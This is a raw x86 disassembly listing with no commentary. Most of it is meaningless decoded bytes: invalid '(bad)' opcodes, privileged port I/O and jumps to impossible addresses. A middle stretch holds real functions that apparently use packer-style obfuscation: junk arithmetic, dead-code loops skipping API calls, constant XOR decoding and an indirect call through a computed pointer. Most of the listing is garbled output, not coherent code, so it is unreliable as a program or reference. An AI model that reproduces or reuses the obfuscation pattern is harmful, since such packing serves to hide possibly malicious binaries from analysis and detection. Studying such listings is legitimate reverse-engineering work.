  40f281:	ror    BYTE PTR [ebp-0x498941ad],cl
  40f287:	ja     0x40f2a6
  40f289:	ja     0x40f2b3
  40f28b:	or     ch,dl
  40f28d:	pusha  
  40f28e:	lds    edx,FWORD PTR [eax]
  40f290:	cmp    ecx,DWORD PTR [edx+0xa]
  40f293:	jb     0x40f260
  40f295:	sti    
  40f296:	push   ebp
  40f297:	adc    eax,0x174cd804
  40f29c:	push   cs
  40f29d:	lods   eax,DWORD PTR ds:[esi]
  40f29e:	jns    0x40f2f6
  40f2a0:	cmp    al,cl
  40f2a2:	sub    eax,0x337e0684
  40f2a7:	mov    ah,0x35
  40f2a9:	pop    ds
  40f2aa:	(bad)  
  40f2ab:	test   al,0xc2
  40f2ad:	out    dx,al
  40f2ae:	and    ebx,DWORD PTR [edx+0x72]
  40f2b1:	mov    edi,0x5fa29f85
  40f2b6:	rol    BYTE PTR [eax],cl
  40f2b8:	mov    ds:0x6a6b5109,eax
  40f2bd:	in     al,dx
  40f2be:	push   ebx
  40f2bf:	out    0xda,al
  40f2c1:	imul   eax,DWORD PTR [edi],0x59fefabf
  40f2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c8:	xchg   esp,eax
  40f2c9:	pop    ebx
  40f2ca:	sub    DWORD PTR [esp+eax*1+0x28],ebx
  40f2ce:	push   0x1be46d8e
  40f2d3:	push   es
  40f2d4:	jnp    0x40f2be
  40f2d6:	shrd   DWORD PTR [ebx+0x2cb580a8],edi,0x59
  40f2de:	mov    edx,0x4d23fa16
  40f2e3:	pop    edi
  40f2e4:	and    eax,0x6619a6e1
  40f2e9:	jmp    0xe7fac059
  40f2ee:	iret   
  40f2ef:	dec    eax
  40f2f0:	repnz call 0x6def:0xa8619652
  40f2f8:	pushf  
  40f2f9:	mov    al,ds:0x34da1777
  40f2fe:	pop    ax
  40f300:	lahf   
  40f301:	sti    
  40f302:	and    al,0x17
  40f304:	dec    eax
  40f305:	int    0xfb
  40f307:	mov    ebp,0x5c16908d
  40f30c:	inc    eax
  40f30d:	fadd   QWORD PTR ds:0x7a0f8e03
  40f313:	sub    al,0xbc
  40f315:	loopne 0x40f34c
  40f317:	out    dx,eax
  40f318:	in     al,dx
  40f319:	sbb    al,0x4c
  40f31b:	sbb    BYTE PTR [ecx],bh
  40f31d:	push   esp
  40f31e:	imul   esi,edi,0xffffff93
  40f321:	add    DWORD PTR [ebp+0xd],ecx
  40f324:	pop    eax
  40f325:	mov    BYTE PTR [ebp+eax*4-0x46dc97b7],bl
  40f32c:	stos   BYTE PTR es:[edi],al
  40f32d:	dec    ecx
  40f32e:	aas    
  40f32f:	iret   
  40f330:	push   ecx
  40f331:	fisttp DWORD PTR [eax]
  40f333:	je     0x40f366
  40f335:	std    
  40f336:	cmc    
  40f337:	sub    DWORD PTR [ebx-0x7a],edx
  40f33a:	test   BYTE PTR [esi+ebp*8+0x398350b0],dl
  40f341:	xchg   esp,eax
  40f342:	and    BYTE PTR [ecx+0xc],0xb5
  40f346:	xor    ch,BYTE PTR [esi-0x79497fc4]
  40f34c:	lahf   
  40f34d:	push   0x2c9659b8
  40f352:	outs   dx,BYTE PTR ds:[esi]
  40f353:	cmp    al,0x2c
  40f355:	sahf   
  40f356:	rcl    DWORD PTR [ecx-0x3b662687],1
  40f35c:	add    ch,ch
  40f35e:	mov    ebp,0x88a95736
  40f363:	inc    eax
  40f364:	mov    ecx,0xbc647838
  40f369:	repz adc al,0x34
  40f36c:	add    esi,DWORD PTR [eax-0x5970979d]
  40f372:	das    
  40f373:	test   al,0xc5
  40f375:	sbb    ecx,DWORD PTR [ecx-0x70]
  40f378:	es push edi
  40f37a:	dec    esi
  40f37b:	pop    ecx
  40f37c:	fld    TBYTE PTR [edi+0x36]
  40f37f:	push   cs
  40f380:	xor    al,0x2c
  40f382:	lds    edx,FWORD PTR [eax]
  40f384:	cli    
  40f385:	mov    al,BYTE PTR [ecx-0x762f86a7]
  40f38b:	and    eax,0x702d3809
  40f390:	shl    DWORD PTR [ebx+ebp*8],cl
  40f393:	xchg   esi,eax
  40f394:	sub    DWORD PTR [esi+0x32],ebp
  40f397:	jae    0x40f329
  40f399:	xchg   esp,eax
  40f39a:	ret    
  40f39b:	rcl    BYTE PTR [edi-0x4760b957],1
  40f3a1:	cmc    
  40f3a2:	retf   0x6adb
  40f3a5:	pop    edi
  40f3a6:	(bad)
  40f3a9:	sub    eax,0xd5465167
  40f3ae:	das    
  40f3af:	sub    ebx,DWORD PTR [esi]
  40f3b1:	inc    esi
  40f3b2:	frstor [ebp+0x6]
  40f3b5:	imul   BYTE PTR [ebp-0x4e48f994]
  40f3bb:	mov    edx,0xa71880ad
  40f3c0:	out    dx,eax
  40f3c1:	cmp    eax,0x4cc1373b
  40f3c6:	dec    ecx
  40f3c7:	add    al,0x2
  40f3c9:	push   ebp
  40f3ca:	call   FWORD PTR [edi+0x3]
  40f3cd:	daa    
  40f3ce:	sbb    al,al
  40f3d0:	xchg   edi,eax
  40f3d1:	aaa    
  40f3d2:	loop   0x40f3f7
  40f3d4:	adc    eax,0x23056abf
  40f3d9:	or     eax,0x8ae64a28
  40f3de:	adc    DWORD PTR [edx*2+0x554199c6],ebx
  40f3e5:	pusha  
  40f3e6:	jl     0x40f383
  40f3e8:	add    DWORD PTR [ecx-0x64],0xbc0be0c2
  40f3ef:	shr    BYTE PTR [edi+0x20],1
  40f3f2:	xchg   BYTE PTR [esp+edx*8-0x9420b6c],dh
  40f3f9:	loope  0x40f3bf
  40f3fb:	jne    0x40f468
  40f3fd:	lea    edx,[ebx-0x4dd12d2]
  40f403:	mov    dh,0x8c
  40f405:	sar    DWORD PTR [edx+0x558b6d03],1
  40f40b:	out    0xf8,eax
  40f40d:	jb     0x40f407
  40f40f:	xchg   esp,eax
  40f410:	iret   
  40f411:	scas   eax,DWORD PTR es:[edi]
  40f412:	ja     0x40f450
  40f414:	mov    edx,0x54661ecb
  40f419:	iret   
  40f41a:	ficomp WORD PTR [ebp-0xe]
  40f41d:	sub    DWORD PTR [ecx-0x62],edi
  40f420:	dec    edx
  40f421:	sub    esp,DWORD PTR [ebp-0x57c5d75f]
  40f427:	jns    0x40f43e
  40f429:	xchg   esi,eax
  40f42a:	and    edi,eax
  40f42c:	inc    esp
  40f42d:	aas    
  40f42e:	jmp    0x6d82:0xf657c1a3
  40f435:	push   cs
  40f436:	push   es
  40f437:	in     al,0xc8
  40f439:	pusha  
  40f43a:	pusha  
  40f43b:	daa    
  40f43c:	xor    ch,dl
  40f43e:	in     al,0x15
  40f440:	jbe    0x40f4a2
  40f442:	mov    esi,0x9af28375
  40f447:	out    dx,eax
  40f448:	popf   
  40f449:	or     DWORD PTR [ebx+eax*4-0x3bcd01bf],ebp
  40f450:	adc    eax,0x26e7555
  40f455:	jno    0x40f444
  40f457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f458:	rcl    esp,cl
  40f45a:	push   ds
  40f45b:	sub    ecx,ecx
  40f45d:	or     esp,DWORD PTR [eax+edx*2]
  40f460:	xor    bl,BYTE PTR [esi]
  40f462:	jp     0x40f3f8
  40f464:	dec    edi
  40f465:	cdq    
  40f466:	inc    ebp
  40f467:	out    dx,al
  40f468:	adc    eax,0xe96fb51f
  40f46d:	xchg   edx,eax
  40f46e:	push   eax
  40f46f:	repz shl BYTE PTR ds:0xb5fbb9ba,1
  40f476:	adc    eax,0xa35afb1b
  40f47b:	mov    DWORD PTR [ecx+0x140457ad],ebx
  40f481:	lods   al,BYTE PTR ds:[esi]
  40f482:	outs   dx,DWORD PTR ds:[esi]
  40f483:	imul   BYTE PTR [edx+0x51]
  40f486:	pop    esp
  40f487:	cmp    al,0xa
  40f489:	cld    
  40f48a:	xchg   esi,eax
  40f48b:	je     0x40f4ce
  40f48d:	fstp   DWORD PTR [esi-0x7451f60f]
  40f493:	data16 xor al,cl
  40f496:	lods   al,BYTE PTR ds:[esi]
  40f497:	add    al,0xc
  40f499:	popa   
  40f49a:	jb     0x40f4eb
  40f49c:	mov    bh,0xdc
  40f49e:	sub    eax,0x7f55eaca
  40f4a3:	hlt    
  40f4a4:	shl    BYTE PTR [esp+eax*1-0x5a2ce68f],0x51
  40f4ac:	imul   ebx,DWORD PTR [eax],0xff7c78a1
  40f4b2:	mov    esp,DWORD PTR [edi+eax*8-0x4081165a]
  40f4b9:	call   0x29f532ce
  40f4be:	(bad)  
  40f4c0:	add    ebp,DWORD PTR [ebp+0x3c0b019c]
  40f4c6:	mov    cl,0x70
  40f4c8:	xchg   esp,esi
  40f4ca:	cmp    eax,0x9a71b646
  40f4cf:	adc    BYTE PTR [esi],0x79
  40f4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4d3:	shl    ah,cl
  40f4d5:	and    DWORD PTR [edx-0x35],ecx
  40f4d8:	leave  
  40f4d9:	sbb    al,BYTE PTR [eax]
  40f4db:	xor    ecx,DWORD PTR [esi+eiz*8-0x2b]
  40f4df:	fcomp  st(7)
  40f4e1:	(bad)  
  40f4e2:	push   cs
  40f4e3:	cmp    BYTE PTR [edx-0x76cd2bf9],dl
  40f4e9:	rcr    ebp,cl
  40f4eb:	sub    eax,ebp
  40f4ed:	stos   DWORD PTR es:[edi],eax
  40f4ee:	btc    DWORD PTR [edi],ebp
  40f4f1:	adc    BYTE PTR [eax-0x46],bl
  40f4f4:	adc    ah,ch
  40f4f6:	repz adc DWORD PTR [ebx-0x70],ebp
  40f4fa:	add    DWORD PTR [ecx+0x44a64202],ecx
  40f500:	out    0x46,al
  40f502:	btr    DWORD PTR [edi-0x4c7df720],0xc9
  40f50a:	cli    
  40f50b:	cdq    
  40f50c:	inc    ebx
  40f50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f50e:	das    
  40f50f:	ret    0x21ab
  40f512:	mov    ch,0x48
  40f514:	retf   0xc17
  40f517:	jle    0x40f51e
  40f519:	stos   DWORD PTR es:[edi],eax
  40f51a:	xchg   esi,eax
  40f51b:	lea    ebp,gs:[eax-0x46]
  40f51f:	push   esi
  40f520:	retf   0x3660
  40f523:	ror    DWORD PTR [ebx],0x50
  40f526:	and    ch,BYTE PTR ds:0x6d579a5
  40f52c:	fdivr  DWORD PTR [ebx-0x1]
  40f52f:	add    BYTE PTR [edi],0xd0
  40f532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f533:	sar    DWORD PTR [edx],1
  40f535:	mov    cl,0x5a
  40f537:	jle    0x40f5af
  40f539:	pushf  
  40f53a:	mov    cl,BYTE PTR [eax+0x17]
  40f53d:	push   esi
  40f53e:	out    dx,eax
  40f53f:	add    DWORD PTR [ecx],eax
  40f541:	rcr    DWORD PTR [edx+edi*8],1
  40f544:	and    cl,BYTE PTR [esi-0x7c]
  40f547:	sar    DWORD PTR [esi+eax*1-0x78],0x80
  40f54c:	inc    edi
  40f54d:	dec    edi
  40f54e:	aad    0x6e
  40f550:	int    0xfe
  40f552:	xor    ebx,0x61
  40f555:	sbb    ebp,DWORD PTR [ecx-0x7a]
  40f558:	wrmsr  
  40f55a:	fist   DWORD PTR [ebp-0x49b75edc]
  40f560:	cmp    ah,BYTE PTR [esi+0x10]
  40f563:	mov    al,ds:0x649c216c
  40f568:	lods   eax,DWORD PTR ds:[esi]
  40f569:	pop    ds
  40f56a:	jl     0x40f5ab
  40f56c:	jle    0x40f597
  40f56e:	or     DWORD PTR [esi-0x77f925ae],ebp
  40f574:	gs add ecx,ebx
  40f577:	cdq    
  40f578:	jne    0x40f5a1
  40f57a:	xor    al,0x5f
  40f57c:	leave  
  40f57d:	loopne 0x40f5c0
  40f57f:	add    al,0x4d
  40f581:	sub    dl,BYTE PTR [ecx-0x76e77e4d]
  40f587:	or     dh,BYTE PTR [edi+0x3851eeef]
  40f58d:	pop    gs
  40f58f:	inc    esi
  40f590:	xor    al,0xe5
  40f592:	push   eax
  40f593:	mov    edi,0xf5e94d7a
  40f598:	lds    eax,FWORD PTR [eax-0x25ed6d09]
  40f59e:	jmp    0x3ac30a57
  40f5a3:	jg     0x40f52f
  40f5a5:	sbb    cl,ah
  40f5a7:	inc    esp
  40f5a8:	push   esp
  40f5a9:	ror    DWORD PTR [edx+0x48],1
  40f5ac:	nop
  40f5ad:	push   ss
  40f5ae:	scas   eax,DWORD PTR es:[edi]
  40f5af:	jmp    esp
  40f5b1:	sbb    ch,BYTE PTR [edx+0x157398b7]
  40f5b7:	hlt    
  40f5b8:	sar    DWORD PTR [ecx],0x5c
  40f5bb:	ds jne 0x40f586
  40f5be:	cmp    dl,BYTE PTR [ecx-0x7f]
  40f5c1:	gs scas eax,DWORD PTR es:[edi]
  40f5c3:	cmp    DWORD PTR [ecx-0xc],edi
  40f5c6:	push   edi
  40f5c7:	gs mov dh,0xe2
  40f5ca:	shr    BYTE PTR [edi],1
  40f5cc:	pop    ecx
  40f5cd:	imul   edx,DWORD PTR [ebx],0x2d
  40f5d0:	mov    bl,0x64
  40f5d2:	cmp    BYTE PTR [edx*4-0x15635009],bl
  40f5d9:	jmp    0x3839:0x5127d220
  40f5e0:	and    BYTE PTR [eax+0x2406da65],dh
  40f5e6:	mov    bl,0x16
  40f5e8:	push   esi
  40f5e9:	sub    al,cl
  40f5eb:	enter  0x8909,0xf0
  40f5ef:	inc    ebx
  40f5f0:	xor    esi,DWORD PTR ds:0xc4b6d646
  40f5f6:	fs adc eax,0x63283789
  40f5fc:	sahf   
  40f5fd:	je     0x40f64e
  40f5ff:	jne    0x40f664
  40f601:	push   ds
  40f602:	fwait
  40f603:	lahf   
  40f604:	or     eax,0x74de6e1f
  40f609:	test   DWORD PTR [edx+esi*1-0x7b],edx
  40f60d:	mov    esi,0x71a69aab
  40f612:	jo     0x40f5ac
  40f614:	cmp    BYTE PTR [ecx],cl
  40f616:	push   ebp
  40f617:	loope  0x40f64c
  40f619:	stos   DWORD PTR es:[edi],eax
  40f61a:	xor    bl,bl
  40f61c:	dec    edx
  40f61d:	sub    BYTE PTR [edx-0x3c54c45],dl
  40f623:	xor    ch,cl
  40f625:	mov    ecx,0xb4570645
  40f62a:	daa    
  40f62b:	ror    DWORD PTR [edi-0x4bacbcd],1
  40f631:	mov    al,ds:0xb8493416
  40f636:	cmp    ecx,esi
  40f638:	out    dx,eax
  40f639:	mov    fs,WORD PTR [ebx]
  40f63b:	(bad)  
  40f63c:	(bad)  
  40f63d:	push   ss
  40f63e:	xor    al,0x6
  40f640:	sbb    al,0x18
  40f642:	test   BYTE PTR [esi+0x41],0x3
  40f646:	in     eax,dx
  40f647:	xchg   ebp,eax
  40f648:	in     eax,dx
  40f649:	cmp    bh,BYTE PTR [ebx]
  40f64b:	or     DWORD PTR [esi-0x3d],edx
  40f64e:	mov    DWORD PTR [ecx-0x2cbae05],edi
  40f654:	mov    DWORD PTR [ebx-0x11c89305],ecx
  40f65a:	aam    0xb8
  40f65c:	ins    DWORD PTR es:[edi],dx
  40f65d:	fisubr DWORD PTR [esi+0x4]
  40f660:	xlat   BYTE PTR ds:[ebx]
  40f661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f662:	mov    BYTE PTR ds:0xe600c326,ch
  40f668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f669:	stos   DWORD PTR es:[edi],eax
  40f66a:	mov    al,0x86
  40f66c:	push   ds
  40f66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f66e:	lock stos DWORD PTR es:[edi],eax
  40f670:	jae    0x40f6cd
  40f672:	cmp    ebp,DWORD PTR [ebp+0x6c]
  40f675:	lods   al,BYTE PTR ds:[esi]
  40f676:	push   es
  40f677:	lds    esi,FWORD PTR [ebp+0x514fa50e]
  40f67d:	test   eax,0x68811f4d
  40f682:	fidivr DWORD PTR [ebx+0x7ad43404]
  40f688:	imul   esi,DWORD PTR [ebx],0x3e911814
  40f68e:	cmc    
  40f68f:	mov    al,ds:0xbafe929
  40f694:	loope  0x40f667
  40f696:	xchg   esp,eax
  40f697:	sar    BYTE PTR [ebx+0x524ceaf9],cl
  40f69d:	add    bl,BYTE PTR [eax+0x6bbc848f]
  40f6a3:	aam    0x3a
  40f6a5:	imul   edi,ebp,0xffffffd0
  40f6a8:	aaa    
  40f6a9:	mov    cl,0x9a
  40f6ab:	mov    ecx,0xfe00f107
  40f6b0:	and    DWORD PTR [edx-0x296cb4df],edi
  40f6b6:	shl    DWORD PTR [esi],cl
  40f6b8:	call   0xbb66bce1
  40f6bd:	leave  
  40f6be:	fnstcw WORD PTR [esi-0x3a]
  40f6c1:	mov    ds:0x3ac36640,eax
  40f6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6c7:	data16 loopne 0x40f67f
  40f6ca:	retf   0x258c
  40f6cd:	pop    edx
  40f6ce:	pop    edi
  40f6cf:	loop   0x40f69b
  40f6d1:	dec    esi
  40f6d2:	pop    es
  40f6d3:	mov    edi,0xaf5d53a1
  40f6d8:	dec    edi
  40f6d9:	pop    ebp
  40f6da:	pop    ebp
  40f6db:	mov    ah,0x81
  40f6dd:	imul   ebp,DWORD PTR [ecx+edx*4-0x463a38d],0xfffffff8
  40f6e5:	int3   
  40f6e6:	push   edx
  40f6e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6e8:	lahf   
  40f6e9:	rcl    ah,0xab
  40f6ec:	out    0x58,al
  40f6ee:	or     DWORD PTR ds:0x99f4040c,0xf48c4cef
  40f6f8:	xchg   esi,eax
  40f6f9:	pop    eax
  40f6fa:	xor    esp,eax
  40f6fc:	add    DWORD PTR [edx+0x1a],esp
  40f6ff:	icebp  
  40f700:	mov    bl,0xac
  40f702:	repnz fcmovb st,st(2)
  40f705:	js     0x40f692
  40f707:	add    esi,DWORD PTR [ebp+0x22ea3e86]
  40f70d:	cmp    DWORD PTR [ebp+0x6a9460e4],ebp
  40f713:	or     DWORD PTR [edi+0x63a755c5],0x7b41a5f5
  40f71d:	push   esp
  40f71e:	cmp    DWORD PTR [ebp-0x4f],eax
  40f721:	call   0x808e9438
  40f726:	iret   
  40f727:	xchg   DWORD PTR [ebx-0x5e],ebx
  40f72a:	cld    
  40f72b:	adc    al,0x98
  40f72d:	int    0x8f
  40f72f:	cld    
  40f730:	popa   
  40f731:	aad    0xb6
  40f733:	xchg   ebp,eax
  40f734:	clc    
  40f735:	shr    BYTE PTR [edi+0x18],cl
  40f738:	outs   dx,DWORD PTR ds:[esi]
  40f739:	int    0x97
  40f73b:	out    0x64,eax
  40f73d:	push   edx
  40f73e:	and    esp,DWORD PTR [edx+ebp*4-0x4d]
  40f742:	xor    al,bh
  40f744:	xchg   ch,cl
  40f746:	test   al,0xf1
  40f748:	les    ecx,FWORD PTR [esi]
  40f74a:	rol    DWORD PTR [edx-0x3b184315],1
  40f750:	add    ebx,0x1002
  40f756:	lea    eax,[ebp-0x18]
  40f759:	add    edx,eax
  40f75b:	add    edx,0x5
  40f75e:	push   edx
  40f75f:	inc    esi
  40f760:	pop    ecx
  40f761:	dec    ecx
  40f762:	xchg   ecx,eax
  40f763:	dec    eax
  40f764:	xchg   ecx,eax
  40f765:	dec    ecx
  40f766:	xchg   ecx,edx
  40f768:	dec    edx
  40f769:	push   edx
  40f76a:	mov    edx,ebx
  40f76c:	pop    ebx
  40f76d:	dec    ebx
  40f76e:	call   DWORD PTR [ebx]
  40f770:	cmp    DWORD PTR [ebp+0x10],esi
  40f773:	je     0x40f794
  40f779:	xchg   edx,eax
  40f77a:	push   0xc
  40f77c:	pop    ecx
  40f77d:	dec    ecx
  40f77e:	push   0x3
  40f780:	pop    ebx
  40f781:	inc    ebx
  40f782:	xchg   ebx,ecx
  40f784:	inc    ecx
  40f785:	sub    ebx,ecx
  40f787:	xchg   ebx,ecx
  40f789:	dec    ecx
  40f78a:	dec    ecx
  40f78b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f78e:	imul   eax,ecx
  40f791:	add    esp,eax
  40f793:	xchg   edx,eax
  40f794:	push   eax
  40f795:	xor    ebx,ebx
  40f797:	mov    edx,esp
  40f799:	dec    edx
  40f79a:	inc    ebx
  40f79b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f79e:	dec    ebx
  40f79f:	xor    edx,edx
  40f7a1:	add    DWORD PTR [ebp-0x10],ebx
  40f7a4:	pop    ebx
  40f7a5:	mov    eax,DWORD PTR [ebp-0x10]
  40f7a8:	pop    edi
  40f7a9:	pop    esi
  40f7aa:	pop    ebx
  40f7ab:	leave  
  40f7ac:	ret    0x10
  40f7af:	push   ebp
  40f7b0:	mov    ebp,esp
  40f7b2:	push   ecx
  40f7b3:	sbb    DWORD PTR ds:0x42a406,0x42a422
  40f7bd:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40f7c4:	and    DWORD PTR ds:0x42a42e,0x1336
  40f7ce:	mov    eax,DWORD PTR [ebp-0x4]
  40f7d1:	mov    edx,DWORD PTR [ebp+0x10]
  40f7d4:	mov    ecx,0x75108a8
  40f7d9:	add    DWORD PTR ds:0x42a3c6,0x42a3f6
  40f7e3:	xor    eax,ecx
  40f7e5:	xor    DWORD PTR ds:0x42a3ce,0x42a422
  40f7ef:	add    eax,0x3272ef
  40f7f4:	and    DWORD PTR ds:0x42a3b2,0x42a44a
  40f7fe:	mov    DWORD PTR [edx],eax
  40f800:	and    eax,eax
  40f802:	mov    eax,DWORD PTR [ebp+0xc]
  40f805:	xor    eax,ecx
  40f807:	push   esi
  40f808:	mov    esi,DWORD PTR [ebp+0x10]
  40f80b:	mov    edx,0x3272ef
  40f810:	adc    DWORD PTR ds:0x42a3da,0x42a3ee
  40f81a:	add    eax,edx
  40f81c:	mov    DWORD PTR [esi+0x4],eax
  40f81f:	and    DWORD PTR ds:0x42a40a,edi
  40f825:	mov    eax,DWORD PTR [ebp+0x14]
  40f828:	sub    esi,DWORD PTR ds:0x42a3f6
  40f82e:	mov    esi,DWORD PTR [ebp+0x10]
  40f831:	mov    DWORD PTR [esi+0x8],eax
  40f834:	mov    eax,DWORD PTR [ebp+0x18]
  40f837:	movzx  esi,WORD PTR ds:0x42a43e
  40f83e:	sbb    esi,DWORD PTR ds:0x42a44e
  40f844:	mov    DWORD PTR ds:0x42a43e,esi
  40f84a:	mov    esi,DWORD PTR [ebp+0x10]
  40f84d:	mov    DWORD PTR [esi+0xc],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x1c]
  40f853:	mov    esi,DWORD PTR [ebp+0x10]
  40f856:	mov    DWORD PTR [esi+0x10],eax
  40f859:	mov    eax,DWORD PTR [ebp+0x8]
  40f85c:	xor    eax,ecx
  40f85e:	add    eax,edx
  40f860:	pop    esi
  40f861:	leave  
  40f862:	ret    0x18
  40f865:	push   ebp
  40f866:	mov    ebp,esp
  40f868:	sub    esp,0x9c
  40f86e:	and    DWORD PTR ds:0x42a3ba,0x0
  40f878:	mov    ecx,DWORD PTR ds:0x42a3ba
  40f87e:	inc    ecx
  40f87f:	mov    DWORD PTR ds:0x42a3ba,ecx
  40f885:	cmp    DWORD PTR ds:0x42a3ba,0x21
  40f88c:	jge    0x40f8b7
  40f892:	jmp    0x40f8aa
  40f897:	push   DWORD PTR [ebp-0x18]
  40f89a:	push   0x36e7
  40f89f:	push   0x5fbf
  40f8a4:	call   DWORD PTR ds:0x42a562
  40f8aa:	cmp    DWORD PTR ds:0x42a3ba,0x19
  40f8b1:	jb     0x40f878
  40f8b7:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ba:	mov    eax,0x8a96
  40f8bf:	xor    ax,WORD PTR [ecx+0x20]
  40f8c3:	mov    DWORD PTR ds:0x42a426,0x15
  40f8cd:	cmp    DWORD PTR ds:0x42a426,0x0
  40f8d4:	je     0x40f92a
  40f8da:	cmp    DWORD PTR ds:0x42a426,0x2
  40f8e1:	jg     0x40f92a
  40f8e7:	jmp    0x40f8fc
  40f8ec:	push   0x42a3ce
  40f8f1:	push   0x4291b5
  40f8f6:	call   DWORD PTR ds:0x42a542
  40f8fc:	cmp    DWORD PTR ds:0x42a426,0x3
  40f903:	jne    0x40f918
  40f909:	xor    ecx,ecx
  40f90b:	or     ecx,DWORD PTR ds:0x42a426
  40f911:	dec    ecx
  40f912:	mov    DWORD PTR ds:0x42a426,ecx
  40f918:	mov    ecx,DWORD PTR ds:0x42a426
  40f91e:	dec    ecx
  40f91f:	mov    DWORD PTR ds:0x42a426,ecx
  40f925:	jmp    0x40f8cd
  40f92a:	mov    ecx,0x3b59
  40f92f:	add    ax,cx
  40f932:	mov    DWORD PTR ds:0x42a3fa,0x1d
  40f93c:	cmp    DWORD PTR ds:0x42a3fa,0x0
  40f943:	je     0x40f99e
  40f949:	cmp    DWORD PTR ds:0x42a3fa,0xc
  40f950:	jge    0x40f99e
  40f956:	jmp    0x40f970
  40f95b:	push   0x7643
  40f960:	push   0x429231
  40f965:	push   0x429247
  40f96a:	call   DWORD PTR ds:0x42a506
  40f970:	cmp    DWORD PTR ds:0x42a3fa,0xd
  40f977:	jne    0x40f98c
  40f97d:	xor    ecx,ecx
  40f97f:	or     ecx,DWORD PTR ds:0x42a3fa
  40f985:	dec    ecx
  40f986:	mov    DWORD PTR ds:0x42a3fa,ecx
  40f98c:	mov    ecx,DWORD PTR ds:0x42a3fa
  40f992:	dec    ecx
  40f993:	mov    DWORD PTR ds:0x42a3fa,ecx
  40f999:	jmp    0x40f93c
  40f99e:	movzx  eax,ax
  40f9a1:	sbb    DWORD PTR ds:0x42a442,edx
  40f9a7:	mov    DWORD PTR [ebp-0x10],eax
  40f9aa:	or     DWORD PTR ds:0x42a3f6,edx
  40f9b0:	mov    BYTE PTR [ebp-0x1],0x79
  40f9b4:	lea    eax,[ebp-0x1]
  40f9b7:	mov    DWORD PTR ds:0x42a42a,0x17
  40f9c1:	cmp    DWORD PTR ds:0x42a42a,0x0
  40f9c8:	je     0x40fa00
  40f9ce:	cmp    DWORD PTR ds:0x42a42a,0x26
  40f9d5:	jle    0x40fa00
  40f9db:	jmp    0x40f9ee
  40f9e0:	push   0x429211
  40f9e5:	push   DWORD PTR [ebp-0x14]
  40f9e8:	call   DWORD PTR ds:0x42a50a
  40f9ee:	mov    ecx,DWORD PTR ds:0x42a42a
  40f9f4:	dec    ecx
  40f9f5:	mov    DWORD PTR ds:0x42a42a,ecx
  40f9fb:	jmp    0x40f9c1
  40fa00:	mov    DWORD PTR [ebp-0xc],eax
  40fa03:	adc    DWORD PTR ds:0x42a40e,0x428b
  40fa0d:	mov    al,BYTE PTR [ebp-0x1]
  40fa10:	mov    ecx,DWORD PTR [ebp-0xc]
  40fa13:	xor    al,0x7b
  40fa15:	dec    al
  40fa17:	add    DWORD PTR ds:0x42a452,0x42a3e2
  40fa21:	mov    BYTE PTR [ecx],al
  40fa23:	and    eax,DWORD PTR ds:0x42a3e6
  40fa29:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40fa30:	jmp    0x411db8
  40fa35:	sub    cl,dl
  40fa37:	call   0x2dd482ef
  40fa3c:	ret    
  40fa3d:	int3   
  40fa3e:	pop    eax
  40fa3f:	mov    ah,0x7e
  40fa41:	inc    ebp
  40fa42:	cmp    BYTE PTR [ebp+0x7aad188a],ah
  40fa48:	jp     0x40fa61
  40fa4a:	pop    edi
  40fa4b:	jp     0x40fac7
  40fa4d:	das    
  40fa4e:	pop    esi
  40fa4f:	xor    eax,0x8964b34d
  40fa54:	js     0x40fa36
  40fa56:	and    BYTE PTR [edi+edx*4+0x65],ch
  40fa5a:	sub    dh,BYTE PTR ds:0xc44b074d
  40fa60:	pop    es
  40fa61:	in     eax,0x7a
  40fa63:	pop    eax
  40fa64:	scas   eax,DWORD PTR es:[edi]
  40fa65:	fwait
  40fa66:	daa    
  40fa67:	add    ch,al
  40fa69:	mov    cl,0xbc
  40fa6b:	fcomp  QWORD PTR [edx]
  40fa6d:	inc    esp
  40fa6e:	popa   
  40fa6f:	or     dl,0xbc
  40fa72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa73:	push   0xd6fb7f0d
  40fa78:	iret   
  40fa79:	mov    bl,0x34
  40fa7b:	xlat   BYTE PTR ds:[ebx]
  40fa7c:	inc    eax
  40fa7d:	test   DWORD PTR [ebp-0x3d],esp
  40fa80:	fbstp  TBYTE PTR [edi-0x29]
  40fa83:	mov    cl,0xc9
  40fa85:	mov    WORD PTR ds:0x78f94a03,?
  40fa8b:	(bad)  
  40fa8c:	xor    eax,0x51acc08c
  40fa91:	out    0xfa,eax
  40fa93:	cmc    
  40fa94:	sbb    al,0xd9
  40fa96:	retf   0xca4
  40fa99:	nop
  40fa9a:	inc    esi
  40fa9b:	add    BYTE PTR [ebx-0x40],dl
  40fa9e:	ins    BYTE PTR es:[edi],dx
  40fa9f:	popf   
  40faa0:	jb     0x40fb1e
  40faa2:	(bad)  
  40faa3:	pushf  
  40faa4:	(bad)  
  40faa5:	xlat   BYTE PTR ds:[ebx]
  40faa6:	js     0x40fa7f
  40faa8:	pop    esp
  40faa9:	jp     0x40fa3e
  40faab:	adc    ebx,eax
  40faad:	xchg   esi,eax
  40faae:	push   esp
  40faaf:	frstor [edi-0x74729f86]
  40fab5:	pop    esi
  40fab6:	aam    0x69
  40fab8:	sbb    DWORD PTR [ebp-0x6e92889e],esp
  40fabe:	pushf  
  40fabf:	sbb    BYTE PTR [ecx],dl
  40fac1:	xor    BYTE PTR [esp+ebp*8],dh
  40fac4:	lods   eax,DWORD PTR ds:[esi]
  40fac5:	inc    esp
  40fac6:	dec    edi
  40fac7:	lods   al,BYTE PTR ds:[esi]
  40fac8:	lea    ecx,[edx+0x1ac77a17]
  40face:	sbb    BYTE PTR ss:[ecx],cl
  40fad1:	(bad)  
